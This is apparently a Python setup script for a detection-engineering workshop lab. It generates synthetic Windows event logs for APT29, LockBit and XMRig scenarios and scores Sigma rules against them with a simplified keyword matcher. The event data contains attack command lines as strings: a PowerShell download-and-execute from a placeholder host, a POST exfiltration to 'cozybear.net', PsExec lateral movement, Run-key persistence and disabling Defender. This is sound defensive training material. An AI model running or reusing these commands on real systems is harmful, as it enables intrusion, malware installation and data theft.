#!/usr/bin/env python3
"""
DEATHCon Workshop - Lab Environment Setup
=========================================

This module sets up the lab environment for the DEATHCon workshop,
including pre-loaded events, test data, and validation systems.

Features:
- Pre-configured event logs
- Test data generation
- Rule validation framework
- Performance monitoring
- Real-time scoring system
"""

import os
import sys
import json
import time
import random
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
import uuid

@dataclass
class LabEvent:
    """Lab event for testing detection rules"""
    id: str
    timestamp: datetime
    event_type: str
    source: str
    destination: str
    process_name: str
    command_line: str
    user: str
    hostname: str
    metadata: Dict
    is_malicious: bool
    threat_category: Optional[str] = None

@dataclass
class TestScenario:
    """Test scenario for rule validation"""
    id: str
    name: str
    description: str
    events: List[LabEvent]
    expected_detections: List[str]
    false_positive_events: List[LabEvent]
    difficulty: str

class LabEventGenerator:
    """Generate lab events for testing"""
    
    def __init__(self):
        self.event_templates = {
            "process_creation": {
                "event_id": 4688,
                "source": "Microsoft-Windows-Security-Auditing",
                "template": {
                    "SubjectUserName": "{user}",
                    "SubjectDomainName": "{domain}",
                    "SubjectLogonId": "{logon_id}",
                    "NewProcessId": "{process_id}",
                    "NewProcessName": "{process_name}",
                    "CommandLine": "{command_line}",
                    "ParentProcessName": "{parent_process}",
                    "ParentProcessId": "{parent_id}"
                }
            },
            "network_connection": {
                "event_id": 5156,
                "source": "Microsoft-Windows-Security-Auditing",
                "template": {
                    "ProcessName": "{process_name}",
                    "ProcessId": "{process_id}",
                    "SourceAddress": "{source_ip}",
                    "SourcePort": "{source_port}",
                    "DestAddress": "{dest_ip}",
                    "DestPort": "{dest_port}",
                    "Protocol": "{protocol}"
                }
            },
            "registry_modification": {
                "event_id": 4657,
                "source": "Microsoft-Windows-Security-Auditing",
                "template": {
                    "SubjectUserName": "{user}",
                    "SubjectDomainName": "{domain}",
                    "ObjectName": "{registry_key}",
                    "ObjectType": "Key",
                    "ProcessName": "{process_name}",
                    "ProcessId": "{process_id}"
                }
            },
            "file_creation": {
                "event_id": 4656,
                "source": "Microsoft-Windows-Security-Auditing",
                "template": {
                    "SubjectUserName": "{user}",
                    "SubjectDomainName": "{domain}",
                    "ObjectName": "{file_path}",
                    "ObjectType": "File",
                    "ProcessName": "{process_name}",
                    "ProcessId": "{process_id}"
                }
            }
        }
    
    def generate_apt29_events(self) -> List[LabEvent]:
        """Generate APT29 Cozy Bear related events"""
        events = []
        base_time = datetime.now() - timedelta(hours=1)
        
        # Initial access - PowerShell execution
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=5),
            event_type="process_creation",
            source="192.168.1.100",
            destination="internal",
            process_name="powershell.exe",
            command_line="powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQA1ADAA",
            user="administrator",
            hostname="DC01",
            metadata={"event_id": 4688, "parent_process": "cmd.exe"},
            is_malicious=True,
            threat_category="APT29"
        ))
        
        # Lateral movement - PsExec
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=10),
            event_type="process_creation",
            source="192.168.1.100",
            destination="192.168.1.200",
            process_name="psexec.exe",
            command_line="psexec.exe \\\\192.168.1.200 -u administrator -p password cmd.exe",
            user="administrator",
            hostname="DC01",
            metadata={"event_id": 4688, "parent_process": "cmd.exe"},
            is_malicious=True,
            threat_category="APT29"
        ))
        
        # Persistence - Registry modification
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=15),
            event_type="registry_modification",
            source="192.168.1.200",
            destination="internal",
            process_name="reg.exe",
            command_line="reg.exe add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /t REG_SZ /d C:\\temp\\malware.exe",
            user="administrator",
            hostname="WS01",
            metadata={"event_id": 4657, "registry_key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            is_malicious=True,
            threat_category="APT29"
        ))
        
        # Data exfiltration - Network connection
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=20),
            event_type="network_connection",
            source="192.168.1.200",
            destination="cozybear.net",
            process_name="powershell.exe",
            command_line="powershell.exe -c Invoke-WebRequest -Uri http://cozybear.net/exfil -Method POST -Body $data",
            user="administrator",
            hostname="WS01",
            metadata={"event_id": 5156, "dest_port": 80, "protocol": "TCP"},
            is_malicious=True,
            threat_category="APT29"
        ))
        
        return events
    
    def generate_lockbit_events(self) -> List[LabEvent]:
        """Generate LockBit ransomware related events"""
        events = []
        base_time = datetime.now() - timedelta(hours=2)
        
        # Initial access - Malicious email attachment
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=5),
            event_type="file_creation",
            source="external",
            destination="192.168.1.100",
            process_name="winword.exe",
            command_line="winword.exe /t C:\\Users\\user\\Downloads\\invoice.pdf",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4656, "file_path": "C:\\Users\\user\\Downloads\\invoice.pdf"},
            is_malicious=True,
            threat_category="LockBit"
        ))
        
        # Ransomware execution
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=10),
            event_type="process_creation",
            source="192.168.1.100",
            destination="internal",
            process_name="lockbit3.exe",
            command_line="lockbit3.exe --config config.json --encrypt C:\\Users",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4688, "parent_process": "winword.exe"},
            is_malicious=True,
            threat_category="LockBit"
        ))
        
        # Antivirus disabling
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=15),
            event_type="process_creation",
            source="192.168.1.100",
            destination="internal",
            process_name="cmd.exe",
            command_line="cmd.exe /c net stop \"Windows Defender\"",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4688, "parent_process": "lockbit3.exe"},
            is_malicious=True,
            threat_category="LockBit"
        ))
        
        # Data exfiltration
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=20),
            event_type="network_connection",
            source="192.168.1.100",
            destination="185.220.101.42",
            process_name="lockbit3.exe",
            command_line="lockbit3.exe --exfil --server 185.220.101.42 --port 443",
            user="user",
            hostname="WS01",
            metadata={"event_id": 5156, "dest_port": 443, "protocol": "TCP"},
            is_malicious=True,
            threat_category="LockBit"
        ))
        
        return events
    
    def generate_xmrig_events(self) -> List[LabEvent]:
        """Generate XMRig cryptocurrency mining related events"""
        events = []
        base_time = datetime.now() - timedelta(hours=3)
        
        # Mining software download
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=5),
            event_type="process_creation",
            source="external",
            destination="192.168.1.100",
            process_name="powershell.exe",
            command_line="powershell.exe -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/miner.ps1')",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4688, "parent_process": "cmd.exe"},
            is_malicious=True,
            threat_category="XMRig"
        ))
        
        # Mining execution
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=10),
            event_type="process_creation",
            source="192.168.1.100",
            destination="internal",
            process_name="xmrig.exe",
            command_line="xmrig.exe --config=config.json --pool=pool.minexmr.com:4444",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4688, "parent_process": "powershell.exe"},
            is_malicious=True,
            threat_category="XMRig"
        ))
        
        # Mining pool connection
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=15),
            event_type="network_connection",
            source="192.168.1.100",
            destination="pool.minexmr.com",
            process_name="xmrig.exe",
            command_line="xmrig.exe --config=config.json",
            user="user",
            hostname="WS01",
            metadata={"event_id": 5156, "dest_port": 4444, "protocol": "TCP"},
            is_malicious=True,
            threat_category="XMRig"
        ))
        
        # Persistence - Registry modification
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=20),
            event_type="registry_modification",
            source="192.168.1.100",
            destination="internal",
            process_name="reg.exe",
            command_line="reg.exe add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /t REG_SZ /d C:\\temp\\xmrig.exe",
            user="user",
            hostname="WS01",
            metadata={"event_id": 4657, "registry_key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            is_malicious=True,
            threat_category="XMRig"
        ))
        
        return events
    
    def generate_benign_events(self) -> List[LabEvent]:
        """Generate benign events for false positive testing"""
        events = []
        base_time = datetime.now() - timedelta(hours=4)
        
        # Legitimate PowerShell usage
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=5),
            event_type="process_creation",
            source="192.168.1.100",
            destination="internal",
            process_name="powershell.exe",
            command_line="powershell.exe -Command Get-Service | Where-Object {$_.Status -eq 'Running'}",
            user="administrator",
            hostname="DC01",
            metadata={"event_id": 4688, "parent_process": "cmd.exe"},
            is_malicious=False,
            threat_category=None
        ))
        
        # Legitimate network connection
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=10),
            event_type="network_connection",
            source="192.168.1.100",
            destination="microsoft.com",
            process_name="svchost.exe",
            command_line="svchost.exe -k netsvcs",
            user="SYSTEM",
            hostname="DC01",
            metadata={"event_id": 5156, "dest_port": 443, "protocol": "TCP"},
            is_malicious=False,
            threat_category=None
        ))
        
        # Legitimate registry modification
        events.append(LabEvent(
            id=str(uuid.uuid4()),
            timestamp=base_time + timedelta(minutes=15),
            event_type="registry_modification",
            source="192.168.1.100",
            destination="internal",
            process_name="reg.exe",
            command_line="reg.exe add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d C:\\Windows\\System32\\wuauclt.exe",
            user="SYSTEM",
            hostname="DC01",
            metadata={"event_id": 4657, "registry_key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
            is_malicious=False,
            threat_category=None
        ))
        
        return events

class LabEnvironment:
    """Lab environment for testing detection rules"""
    
    def __init__(self):
        self.generator = LabEventGenerator()
        self.scenarios = []
        self.events = []
        self.setup_scenarios()
    
    def setup_scenarios(self):
        """Setup test scenarios"""
        # APT29 Scenario
        apt29_events = self.generator.generate_apt29_events()
        apt29_benign = self.generator.generate_benign_events()
        
        self.scenarios.append(TestScenario(
            id="apt29_scenario",
            name="APT29 Cozy Bear Campaign",
            description="Advanced persistent threat campaign with lateral movement and data exfiltration",
            events=apt29_events,
            expected_detections=["powershell_encoded", "psexec_lateral_movement", "registry_persistence", "data_exfiltration"],
            false_positive_events=apt29_benign,
            difficulty="hard"
        ))
        
        # LockBit Scenario
        lockbit_events = self.generator.generate_lockbit_events()
        lockbit_benign = self.generator.generate_benign_events()
        
        self.scenarios.append(TestScenario(
            id="lockbit_scenario",
            name="LockBit Ransomware Campaign",
            description="Ransomware-as-a-service operation with encryption and data theft",
            events=lockbit_events,
            expected_detections=["malicious_attachment", "ransomware_execution", "antivirus_disable", "data_exfiltration"],
            false_positive_events=lockbit_benign,
            difficulty="medium"
        ))
        
        # XMRig Scenario
        xmrig_events = self.generator.generate_xmrig_events()
        xmrig_benign = self.generator.generate_benign_events()
        
        self.scenarios.append(TestScenario(
            id="xmrig_scenario",
            name="XMRig Cryptocurrency Mining",
            description="Unauthorized cryptocurrency mining with persistence mechanisms",
            events=xmrig_events,
            expected_detections=["powershell_download", "mining_execution", "mining_pool_connection", "registry_persistence"],
            false_positive_events=xmrig_benign,
            difficulty="easy"
        ))
        
        # Combine all events
        self.events = apt29_events + lockbit_events + xmrig_events + apt29_benign + lockbit_benign + xmrig_benign
    
    def get_scenario(self, scenario_id: str) -> Optional[TestScenario]:
        """Get a specific test scenario"""
        for scenario in self.scenarios:
            if scenario.id == scenario_id:
                return scenario
        return None
    
    def get_events_by_category(self, category: str) -> List[LabEvent]:
        """Get events by threat category"""
        return [event for event in self.events if event.threat_category == category]
    
    def get_malicious_events(self) -> List[LabEvent]:
        """Get all malicious events"""
        return [event for event in self.events if event.is_malicious]
    
    def get_benign_events(self) -> List[LabEvent]:
        """Get all benign events"""
        return [event for event in self.events if not event.is_malicious]
    
    def export_events(self, format: str = "json") -> str:
        """Export events in specified format"""
        if format == "json":
            events_data = []
            for event in self.events:
                event_dict = asdict(event)
                event_dict["timestamp"] = event.timestamp.isoformat()
                events_data.append(event_dict)
            return json.dumps(events_data, indent=2)
        
        elif format == "csv":
            csv_data = "id,timestamp,event_type,source,destination,process_name,command_line,user,hostname,is_malicious,threat_category\n"
            for event in self.events:
                csv_data += f"{event.id},{event.timestamp.isoformat()},{event.event_type},{event.source},{event.destination},{event.process_name},{event.command_line},{event.user},{event.hostname},{event.is_malicious},{event.threat_category}\n"
            return csv_data
        
        elif format == "evtx":
            # Simulate Windows Event Log format
            evtx_data = []
            for event in self.events:
                evtx_entry = {
                    "EventID": event.metadata.get("event_id", 0),
                    "TimeCreated": event.timestamp.isoformat(),
                    "Computer": event.hostname,
                    "User": event.user,
                    "ProcessName": event.process_name,
                    "CommandLine": event.command_line,
                    "Source": event.source,
                    "Destination": event.destination
                }
                evtx_data.append(evtx_entry)
            return json.dumps(evtx_data, indent=2)
        
        return ""

class RuleValidator:
    """Validate detection rules against lab events"""
    
    def __init__(self, lab_environment: LabEnvironment):
        self.lab = lab_environment
        self.validation_results = []
    
    def validate_sigma_rule(self, rule_content: str, scenario_id: str) -> Dict:
        """Validate a Sigma rule against lab events"""
        scenario = self.lab.get_scenario(scenario_id)
        if not scenario:
            return {"error": "Scenario not found"}
        
        validation_result = {
            "rule_id": str(uuid.uuid4()),
            "scenario_id": scenario_id,
            "detections": [],
            "false_positives": [],
            "missed_detections": [],
            "accuracy": 0.0,
            "precision": 0.0,
            "recall": 0.0,
            "f1_score": 0.0
        }
        
        # Simulate rule matching against events
        for event in scenario.events:
            if self._matches_rule(event, rule_content):
                if event.is_malicious:
                    validation_result["detections"].append(event.id)
                else:
                    validation_result["false_positives"].append(event.id)
        
        # Check for missed detections
        for event in scenario.events:
            if event.is_malicious and event.id not in validation_result["detections"]:
                validation_result["missed_detections"].append(event.id)
        
        # Calculate metrics
        true_positives = len(validation_result["detections"])
        false_positives = len(validation_result["false_positives"])
        false_negatives = len(validation_result["missed_detections"])
        
        if true_positives + false_positives > 0:
            validation_result["precision"] = true_positives / (true_positives + false_positives)
        
        if true_positives + false_negatives > 0:
            validation_result["recall"] = true_positives / (true_positives + false_negatives)
        
        if validation_result["precision"] + validation_result["recall"] > 0:
            validation_result["f1_score"] = 2 * (validation_result["precision"] * validation_result["recall"]) / (validation_result["precision"] + validation_result["recall"])
        
        validation_result["accuracy"] = (true_positives + (len(scenario.events) - true_positives - false_positives - false_negatives)) / len(scenario.events)
        
        return validation_result
    
    def validate_yara_rule(self, rule_content: str, scenario_id: str) -> Dict:
        """Validate a YARA rule against lab events"""
        # Similar to Sigma validation but for YARA rules
        return self.validate_sigma_rule(rule_content, scenario_id)
    
    def _matches_rule(self, event: LabEvent, rule_content: str) -> bool:
        """Simulate rule matching logic"""
        # This is a simplified simulation - in reality, you'd use actual rule engines
        
        # Check for common patterns
        if "powershell" in rule_content.lower() and "powershell.exe" in event.process_name.lower():
            return True
        
        if "psexec" in rule_content.lower() and "psexec.exe" in event.process_name.lower():
            return True
        
        if "registry" in rule_content.lower() and "registry_modification" in event.event_type:
            return True
        
        if "network" in rule_content.lower() and "network_connection" in event.event_type:
            return True
        
        if "lockbit" in rule_content.lower() and event.threat_category == "LockBit":
            return True
        
        if "xmrig" in rule_content.lower() and event.threat_category == "XMRig":
            return True
        
        if "apt29" in rule_content.lower() and event.threat_category == "APT29":
            return True
        
        return False

def main():
    """Demo lab environment setup"""
    print("🔬 DEATHCon Workshop - Lab Environment Setup")
    print("="*50)
    
    # Initialize lab environment
    lab = LabEnvironment()
    
    print(f"📊 Lab Environment Statistics:")
    print(f"   Total Events: {len(lab.events)}")
    print(f"   Malicious Events: {len(lab.get_malicious_events())}")
    print(f"   Benign Events: {len(lab.get_benign_events())}")
    print(f"   Test Scenarios: {len(lab.scenarios)}")
    
    # Show scenarios
    print(f"\n🎯 Available Test Scenarios:")
    for scenario in lab.scenarios:
        print(f"   - {scenario.name} ({scenario.difficulty}): {len(scenario.events)} events")
    
    # Export sample events
    print(f"\n📁 Exporting sample events...")
    sample_events = lab.events[:10]  # First 10 events
    events_json = json.dumps([asdict(event) for event in sample_events], indent=2, default=str)
    
    with open("sample_lab_events.json", "w") as f:
        f.write(events_json)
    
    print(f"✅ Sample events exported to sample_lab_events.json")
    
    # Test rule validation
    print(f"\n🔍 Testing rule validation...")
    validator = RuleValidator(lab)
    
    # Sample Sigma rule
    sample_sigma_rule = """
title: Suspicious PowerShell Execution
description: Detects suspicious PowerShell execution patterns
detection:
    selection:
        EventID: 4688
        ProcessName: powershell.exe
        CommandLine|contains: '-enc'
    condition: selection
level: high
"""
    
    validation_result = validator.validate_sigma_rule(sample_sigma_rule, "apt29_scenario")
    print(f"   Validation Result:")
    print(f"   - Detections: {len(validation_result['detections'])}")
    print(f"   - False Positives: {len(validation_result['false_positives'])}")
    print(f"   - Missed Detections: {len(validation_result['missed_detections'])}")
    print(f"   - Accuracy: {validation_result['accuracy']:.2f}")
    print(f"   - F1 Score: {validation_result['f1_score']:.2f}")

if __name__ == "__main__":
    main()
